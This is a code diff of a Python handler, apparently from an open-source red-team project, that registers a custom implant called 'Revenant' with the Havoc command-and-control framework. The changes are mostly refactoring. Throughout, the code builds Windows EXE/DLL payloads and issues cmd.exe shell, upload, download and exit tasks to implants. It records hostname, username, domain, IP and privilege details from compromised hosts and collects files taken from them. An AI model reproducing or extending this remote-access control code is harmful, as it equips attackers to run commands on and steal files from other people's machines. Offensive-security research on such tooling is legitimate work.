@@ -1,311 +1,273 @@
-import os
+import subprocess
+
 from base64 import b64decode
 from havoc.service import HavocService
 from havoc.agent import *
 
-COMMAND_REGISTER         = 0x100
-COMMAND_GET_JOB          = 0x101
-COMMAND_NO_JOB           = 0x102
-COMMAND_SHELL            = 0x152
-COMMAND_UPLOAD           = 0x153
-COMMAND_DOWNLOAD         = 0x154
-COMMAND_EXIT             = 0x155
-COMMAND_OUTPUT           = 0x200
+COMMAND_REGISTER: int = 0x100
+COMMAND_GET_JOB: int = 0x101
+COMMAND_NO_JOB: int = 0x102
+COMMAND_SHELL: int = 0x152
+COMMAND_UPLOAD: int = 0x153
+COMMAND_DOWNLOAD: int = 0x154
+COMMAND_EXIT: int = 0x155
+COMMAND_OUTPUT: int = 0x200
 
-# ====================
-# ===== Commands =====
-# ====================
+
 class CommandShell(Command):
-    CommandId = COMMAND_SHELL
-    Name = "shell"
-    Description = "executes commands using cmd.exe"
-    Help = ""
-    NeedAdmin = False
-    Params = [
-        CommandParam(
-            name="commands",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
-    Mitr = []
+    def __init__(self):
+        self.CommandId: int = COMMAND_SHELL
+        self.Name: str = "shell"
+        self.Description: str = "executes command using cmd.exe"
+        self.Help: str = ""
+        self.NeedAdmin: bool = False
+        self.Mitr: list = []
+        self.Params: list = [
+            CommandParam(
+                name="commands",
+                is_file_path=False,
+                is_optional=False
+            )
+        ]
 
-    def job_generate( self, arguments: dict ) -> bytes:        
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-        Task.add_data( "c:\windows\system32\cmd.exe /c " + arguments[ 'commands' ] )
-
+    def job_generate(self, arguments: dict) -> bytes:
+        Task: Packer = Packer()
+        Task.add_int(self.CommandId)
+        Task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
         return Task.buffer
 
-class CommandUpload( Command ):
-    CommandId   = COMMAND_UPLOAD
-    Name        = "upload"
-    Description = "uploads a file to the host"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="local_file",
-            is_file_path=True,
-            is_optional=False
-        ),
 
-        CommandParam(
-            name="remote_file",
-            is_file_path=False,
-            is_optional=False
-        )
-    ]
+class CommandUpload(Command):
+    def __init__(self):
+        self.CommandId: int = COMMAND_UPLOAD
+        self.Name: str = "upload"
+        self.Description: str = "uploads a file to the host"
+        self.Help: str = ""
+        self.NeedAdmin: bool = False
+        self.Mitr: list = []
+        self.Params: list = [
+            CommandParam(
+                name="local_file",
+                is_file_path=True,
+                is_optional=False
+            ),
+            CommandParam(
+                name="remote_file",
+                is_file_path=False,
+                is_optional=False
+            )
+        ]
 
-    def job_generate( self, arguments: dict ) -> bytes:
-        
-        Task        = Packer()
-        remote_file = arguments[ 'remote_file' ]
-        fileData    = b64decode( arguments[ 'local_file' ] )
-
-        Task.add_int( self.CommandId )
-        Task.add_data( remote_file )
-        Task.add_data( fileData )
-
+    def job_generate(self, arguments: dict) -> bytes:
+        Task: Packer = Packer()
+        remote_file: str = arguments['remote_file']
+        filedata = b64decode(arguments['local_file']).decode()
+        Task.add_int(self.CommandId)
+        Task.add_data(remote_file)
+        Task.add_data(filedata)
         return Task.buffer
 
-class CommandDownload( Command ):
-    CommandId   = COMMAND_DOWNLOAD
-    Name        = "download"
-    Description = "downloads the requested file"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = [
-        CommandParam(
-            name="remote_file",
-            is_file_path=False,
-            is_optional=False
-        ),
-    ]
 
-    def job_generate( self, arguments: dict ) -> bytes:
-        
-        Task        = Packer()
-        remote_file = arguments[ 'remote_file' ]
+class CommandDownload(Command):
+    def __init__(self):
+        self.CommandId: int = COMMAND_DOWNLOAD
+        self.Name: str = "download"
+        self.Description: str = "downloads the requested file"
+        self.Help: str = ""
+        self.NeedAdmin: bool = False
+        self.Mitr: list = []
+        self.Params: list = [
+            CommandParam(
+                name="remote_file",
+                is_file_path=False,
+                is_optional=False
+            ),
+        ]
 
-        Task.add_int( self.CommandId )
-        Task.add_data( remote_file )
-
+    def job_generate(self, arguments: dict) -> bytes:
+        Task: Packer = Packer()
+        remote_file: str = arguments['remote_file']
+        Task.add_int(self.CommandId)
+        Task.add_data(remote_file)
         return Task.buffer
 
-class CommandExit( Command ):
-    CommandId   = COMMAND_EXIT
-    Name        = "exit"
-    Description = "tells the talon agent to exit"
-    Help        = ""
-    NeedAdmin   = False
-    Mitr        = []
-    Params      = []
 
-    def job_generate( self, arguments: dict ) -> bytes:
+class CommandExit(Command):
+    def __init__(self):
+        self.CommandId: int = COMMAND_EXIT
+        self.Name: str = "exit"
+        self.Description: str = "tells agent to exit"
+        self.Help: str = ""
+        self.NeedAdmin: bool = False
+        self.Mitr: list = []
+        self.Params: list = []
 
-        Task = Packer()
-
-        Task.add_int( self.CommandId )
-
+    def job_generate(self, arguments: dict) -> bytes:
+        Task: Packer = Packer()
+        Task.add_int(self.CommandId)
         return Task.buffer
 
-# =======================
-# ===== Agent Class =====
-# =======================
+
 class Revenant(AgentType):
-    Name = "Revenant"
-    Author = "@0xTriboulet"
-    Version = "0.1"
-    Description = f"""Revenant 3rd party agent for Havoc"""
-    MagicValue = 0x7265766e # 'revn'
+    def __init__(self):
+        self.Name: str = "Revenant"
+        self.Author: str = "TBA"
+        self.Version: str = "0.1"
+        self.Description: str = "Revenant Agent Testing"
+        self.MagicValue = 0xdeaddead
 
-    Arch = [
-        "x64",
-        "x86",
-    ]
+        self.Arch: list = ["x64", "x86"]
+        self.Formats: list = [
+            {"Name": "Windows Exe", "Extension": "exe"},
+            {"Name": "Windows DLL", "Extension": "dll"}
+        ]
+        self.BuildingConfig: dict = {"Sleep": "10"}
+        self.Commands: list = [
+            CommandShell(),
+            CommandUpload(),
+            CommandDownload(),
+            CommandExit()
+        ]
 
-    Formats = [
-        {
-            "Name": "Windows Exe", #windows exe?
-            "Extension": "exe",
-        },
-    ]
+    def generate(self, config: dict) -> None:
+        print(f"[*] Building Revenant Agent {self.Version}")
+        # print(f"config: {config}")
 
-    BuildingConfig = {
-        "Sleep": "10"
-    }
+        self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")
+        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
+        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")
 
-    Commands = [
-        CommandShell(),
-        CommandUpload(),
-        CommandDownload(),
-        CommandExit(),
-    ]
+        # parse options from self
+        print(f"[*] Revenant Magic Value {self.MagicValue}")
 
-    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
-    def generate( self, config: dict ) -> None:
+        # parse config
+        compile_arch = config['Options']['Arch']
+        compile_format = config['Options']['Format']
 
-        print( f"config: {config}" )
+        print(f"[*] Revenant Payload Arch:   {compile_arch}")
+        print(f"[*] Revenant Payload Format: {compile_format}")
+        compile_command: str = "cmake --build ./Agent"
 
-        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
+        try:
+            process = subprocess.run(compile_command,
+                                     shell=True,
+                                     check=True,
+                                     stdout=subprocess.PIPE,
+                                     stderr=subprocess.PIPE,
+                                     universal_newlines=True)
+            print(process.stdout)
+        except subprocess.CalledProcessError as error:
+            print(f"Error occurred: {error.stderr}")
 
-        #CMAKE ; MAKE
-        os.system("cmake ./Agent/CMakeLists.txt ; cmake --build ./Agent")
-
-        #READ
         data = open("./Agent/Bin/Revenant.exe", "rb").read()
 
-        # build_send_payload. this function send back your generated payload
-        self.builder_send_payload( config[ 'ClientID' ], self.Name +"."+self.Formats[0]["Extension"], data ) # this is just an example.
+        # Below line sends the build executable back to Havoc for file management - 0xtriboulet
+        self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)
 
-    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
-    def response( self, response: dict ) -> bytes:
+    def response(self, response: dict) -> bytes:
 
-        agent_header    = response[ "AgentHeader" ]
-        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
-        response_parser = Parser( agent_response, len(agent_response) )
-        Command         = response_parser.parse_int()
+        agent_header: dict = response["AgentHeader"]
+        agent_response = b64decode(response["Response"])
+        response_parser = Parser(agent_response, len(agent_response))
+        Command: int = response_parser.parse_int()
 
-        if response[ "Agent" ] == None:
-            # so when the Agent field is empty this either means that the agent doesn't exists.
-
+        if response["Agent"] is None:
             if Command == COMMAND_REGISTER:
-                print( "[*] Is agent register request" )
+                print("[*] Is agent register request")
 
-                # Register info:
-                #   - AgentID           : int [needed]
-                #   - Hostname          : str [needed]
-                #   - Username          : str [needed]
-                #   - Domain            : str [optional]
-                #   - InternalIP        : str [needed]
-                #   - Process Path      : str [needed]
-                #   - Process Name      : str [needed]
-                #   - Process ID        : int [needed]
-                #   - Process Parent ID : int [optional]
-                #   - Process Arch      : str [needed]
-                #   - Process Elevated  : int [needed]
-                #   - OS Build          : str [needed]
-                #   - OS Version        : str [needed]
-                #   - OS Arch           : str [optional]
-                #   - Sleep             : int [optional]
-
-                RegisterInfo = {
-                    "AgentID"           : response_parser.parse_int(),
-                    "Hostname"          : response_parser.parse_str(),
-                    "Username"          : response_parser.parse_str(),
-                    "Domain"            : response_parser.parse_str(),
-                    "InternalIP"        : response_parser.parse_str(),
-                    "Process Path"      : response_parser.parse_str(),
-                    "Process ID"        : str(response_parser.parse_int()),
-                    "Process Parent ID" : str(response_parser.parse_int()),
-                    "Process Arch"      : response_parser.parse_int(),
-                    "Process Elevated"  : response_parser.parse_int(),
-                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()), # (MajorVersion).(MinorVersion).(ProductType).(ServicePackMajor).(BuildNumber)
-                    "OS Arch"           : response_parser.parse_int(),
-                    "Sleep"             : response_parser.parse_int(),
+                registerinfo = {
+                    "AgentID": response_parser.parse_int(),
+                    "Hostname": response_parser.parse_str(),
+                    "Username": response_parser.parse_str(),
+                    "Domain": response_parser.parse_str(),
+                    "InternalIP": response_parser.parse_str(),
+                    "Process Path": response_parser.parse_str(),
+                    "Process ID": str(response_parser.parse_int()),
+                    "Process Parent ID": str(response_parser.parse_int()),
+                    "Process Arch": response_parser.parse_int(),
+                    "Process Elevated": response_parser.parse_int(),
+                    "OS Build": "{0}.{1}.{2}.{3}.{4}".format(str(response_parser.parse_int()),
+                                                             str(response_parser.parse_int()),
+                                                             str(response_parser.parse_int()),
+                                                             str(response_parser.parse_int()),
+                                                             str(response_parser.parse_int())),
+                    "OS Arch": response_parser.parse_int(),
+                    "Sleep": response_parser.parse_int(),
                 }
 
-                RegisterInfo[ "Process Name" ] = RegisterInfo[ "Process Path" ].split( "\\" )[-1]
+                registerinfo["Process Name"] = registerinfo["Process Path"].split("\\")[-1]
+                registerinfo["OS Version"] = registerinfo["OS Build"]
 
-                # this OS info is going to be displayed on the GUI Session table.
-                RegisterInfo[ "OS Version" ] = RegisterInfo[ "OS Build" ] # "Windows Some version"
+                os_arch_map = {
+                    0: "x86",
+                    9: "x64/AMD64",
+                    5: "ARM",
+                    12: "ARM64",
+                    6: "Itanium-based"
+                }
 
-                if RegisterInfo[ "OS Arch" ] == 0:
-                    RegisterInfo[ "OS Arch" ] = "x86"
-                elif RegisterInfo[ "OS Arch" ] == 9:
-                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
-                elif RegisterInfo[ "OS Arch" ] == 5:
-                    RegisterInfo[ "OS Arch" ] = "ARM"
-                elif RegisterInfo[ "OS Arch" ] == 12:
-                    RegisterInfo[ "OS Arch" ] = "ARM64"
-                elif RegisterInfo[ "OS Arch" ] == 6:
-                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
-                else:
-                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"
+                registerinfo["OS Arch"] = os_arch_map.get(
+                    registerinfo["OS Arch"],
+                    "Unknown (" + str(registerinfo["OS Arch"]) + ")")
 
-                # Process Arch
-                if RegisterInfo[ "Process Arch" ] == 0:
-                    RegisterInfo[ "Process Arch" ] = "Unknown"
+                proc_arch_map = {
+                    0: "Unknown",
+                    1: "x86",
+                    2: "x64",
+                    3: "IA64"
+                }
 
-                elif RegisterInfo[ "Process Arch" ] == 1:
-                    RegisterInfo[ "Process Arch" ] = "x86"
+                registerinfo["Process Arch"] = proc_arch_map.get(
+                    registerinfo["Process Arch"],
+                    "Unknown (" + str(registerinfo["Process Arch"]) + ")")
 
-                elif RegisterInfo[ "Process Arch" ] == 2:
-                    RegisterInfo[ "Process Arch" ] = "x64"
-
-                elif RegisterInfo[ "Process Arch" ] == 3:
-                    RegisterInfo[ "Process Arch" ] = "IA64"
-
-                self.register( agent_header, RegisterInfo )
-
-                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent
-
+                self.register(agent_header, registerinfo)
+                return registerinfo['AgentID'].to_bytes(4, 'little')  # return the agent id to the agent
             else:
-                print( "[-] Is not agent register request" )
+                print("[-] Is not agent register request")
         else:
-            print( f"[*] Something else: {Command}" )
-
-            AgentID = response[ "Agent" ][ "NameID" ]
-
+            print(f"[*] Something else: {Command}")
+            agentid = response["Agent"]["NameID"]
             if Command == COMMAND_GET_JOB:
-                print( "[*] Get list of jobs and return it." )
+                print("[*] Get list of jobs and return it.")
+                Tasks = self.get_task_queue(response["Agent"])
 
-                Tasks = self.get_task_queue( response[ "Agent" ] )
-
-                # if there is no job just send back a COMMAND_NO_JOB command.
                 if len(Tasks) == 0:
-                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )
+                    Tasks = COMMAND_NO_JOB.to_bytes(4, 'little')
 
-                print( f"Tasks: {Tasks.hex()}" )
+                print(f"Tasks: {Tasks.hex()}")
                 return Tasks
 
             elif Command == COMMAND_OUTPUT:
-
-                Output = response_parser.parse_str()
-                print( "[*] Output: \n" + Output )
-
-                self.console_message( AgentID, "Good", "Received Output:", Output )
-
+                output = response_parser.parse_str()
+                print("[*] Output: \n" + output)
+                self.console_message(agentid, "Good", "Received Output:", output)
             elif Command == COMMAND_UPLOAD:
-
-                FileSize = response_parser.parse_int()
-                FileName = response_parser.parse_str()
-
-                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )
-
+                filesize = response_parser.parse_int()
+                filename = response_parser.parse_str()
+                self.console_message(agentid, "Good", f"File was uploaded: {filename} ({filesize} bytes)", "")
             elif Command == COMMAND_DOWNLOAD:
-
-                FileName    = response_parser.parse_str()
-                FileContent = response_parser.parse_str()
-
-                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )
-
-                self.download_file( AgentID, FileName, len(FileContent), FileContent )
-
+                filename = response_parser.parse_str()
+                filecontent = response_parser.parse_str()
+                self.console_message(agentid, "Good", f"File was downloaded: {filename} ({len(filecontent)} bytes)", "")
+                self.download_file(agentid, filename, len(filecontent), filecontent)
             else:
-                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )
+                self.console_message(agentid, "Error", "Command not found: %4x" % Command, "")
 
         return b''
 
 
 def main():
-    Havoc_Revenant = Revenant()
+    havoc_revenant: Revenant = Revenant()
 
-    print( "[*] Connect to Havoc service api" )
-    Havoc_Service = HavocService(
+    print("[*] Connect to Havoc service api")
+    havoc_service = HavocService(
         endpoint="ws://127.0.0.1:40056/service-endpoint",
         password="service-password"
     )
-     
-    print( "[*] Register Revenant to Havoc" )
-    Havoc_Service.register_agent(Havoc_Revenant)
+
+    print("[*] Register Revenant to Havoc")
+    havoc_service.register_agent(havoc_revenant)
 
     return
 
